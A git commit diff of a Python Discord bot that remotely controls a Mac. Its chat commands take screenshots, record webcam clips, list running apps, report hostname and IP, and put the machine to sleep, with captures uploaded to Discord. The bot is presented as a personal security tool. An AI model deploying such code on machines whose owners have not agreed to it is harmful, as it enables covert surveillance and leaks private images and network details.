85f5a7561371e9f6d7de8ece9b6272102e194112
rbs5 <86170100+robism05@users.noreply.github.com>
2022-08-24 23:23:28 +0100

    Update macOS-BOT.py

--- macOS-BOT.py
+++ macOS-BOT.py
@@ -7,13 +7,14 @@ import socket
 import platform
 
 client = discord.Client()
+path = 'put your file path here'
 
 
 # -- functions --
 
 # screenshot
 def take_screen_shot():
-  # save screen shots where
+  # adds the date and time to the name of the screenshot
   call(["screencapture", "Screenshot" + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ".jpg"])
 
 # checks if app is open
@@ -23,7 +24,6 @@ def is_runnning(app):
               "-e", "count (every process whose name is \"" + app + "\")",
               "-e", "end tell"]).strip())
   return count > 0
-
 
 # gets ip address
 def get_ip():
@@ -44,20 +44,15 @@ def get_ip():
 # discord bot
 @client.event
 async def on_ready():
-  print("Program has logged in as {0.user}".format(client))
+  print("Program has logged in as {0.user}".format(client)) # prints to console
   
 @client.event
 async def on_message(message):
   if message.author == client.user:
     return
   if client.user.mentioned_in(message):
-    if platform.system=="Darwin":
-      await message.channel.send('You mentioned me! (macOS)')
-    if platform.system=="Windows":
-      await message.channel.send('You mentioned me! (windows)')
-    else:
-      await message.channel.send('You mentioned me! (other)')
-
+    h_name = socket.gethostname()
+    await message.channel.send('Bot is logged into '+h_name+'!')
 
   elif message.content.startswith("!quit"):
     await message.channel.send('Goodbye!')
@@ -69,53 +64,49 @@ async def on_message(message):
   process = subprocess.Popen(["sleep","0.5"]) 
     
 
-  # bot commands   
+  # ----- bot commands ------
   if message.content.startswith("!close SysPref") and SysPref==True:
     os.system("pkill System Preferences")
     await message.channel.send("System Preferences closed!")
   elif message.content.startswith("!close SysPref") and SysPref==False:
     await message.channel.send("System Preferences is not open")
-  elif message.content.startswith("!open SysPref"):
-    os.system("""osascript -e 'tell app "System Preferences" to open'""")
-    await message.channel.send("System Preferences opened")
 
 
-
+  # takes a screenshot of the user's screen
   elif message.content.startswith("!screenshot"):
-    take_screen_shot()
-    for file in os.listdir("SecurityBot"):
+    take_screen_shot() #links to function that takes ss
+    for file in os.listdir(path):
       if file.endswith(".jpg"):
         await message.channel.send(file=discord.File(file))
         time.sleep(2)
         os.remove(file)
 
-    '''''
-    if platform.system=="Windows":
-      import PIL.ImageGrab
-      screenshot = PIL.ImageGrab.grab()
-      screenshot.save("Windows_screenshot.jpg")
-      screenshot.close()
-      for file in os.listdir("SecurityBot"):
-        if file.endswith(".jpg"):
-          await message.channel.send(file=discord.File(file))
-          time.sleep(2)
-          os.remove(file)
-    '''
-
-
+  # puts the device in sleep mode
   elif message.content.startswith("!sleep"):
     await message.channel.send("Putting your mac to sleep in 5 seconds...")
-    os.system('osascript sleep.scpt {} "{}"')
+    os.system('osascript sleep.scpt {} "{}"') # executes applescript code, exclusive to macOS
   
+  # records a 5 second clip through the user's camera
   elif message.content.startswith("!record"):
     await message.channel.send("Recording your webcam... ")
-    os.system('osascript record.scpt {} "{}"')
-    for file in os.listdir("SecurityBot"):
+    os.system('osascript record.scpt {} "{}"') # executes applescript code, exclusive to macOS
+    for file in os.listdir(path):
       if file.endswith(".mov"): 
         await message.channel.send(file=discord.File(file))
         time.sleep(2)
         os.remove(file)
 
+        
+  # gives list of all currently running apps
+  elif message.content.startswith("!apps"):
+    apps = str(subprocess.check_output(["osascript",
+              "-e", "tell application \"Finder\"",
+              "-e", "get the name of every process whose visible is true",                          
+              "-e", "end tell"]).strip())
+    # VS Code shows up as 'Electron' while other Electron apps (eg Discord) do not
+    await message.channel.send(apps)
+       
+  # gives info about host device eg hostname and IP    
   elif message.content.startswith("!info"):
     h_name = socket.gethostname()
     IP_addres = socket.gethostbyname(h_name)
@@ -123,11 +114,12 @@ async def on_message(message):
     await message.channel.send("**Host Name is:** " + h_name)
     await message.channel.send("**Computer IP Address (localhost) is:** " + IP_addres)
     await message.channel.send(get_ip()+"\n")
-      
+     
+  # opens a tab that opens "Never Gonna Give You Up" in the user's browser    
   elif message.content.startswith("!rickroll"):
-    os.system('osascript rickroll.scpt {} "{}"')
+    os.system('osascript rickroll.scpt {} "{}"') # executes applescript code, exclusive to macOS
     
 
     
-
+# removing my key as to prevent malicious use
 client.run('key goes here')
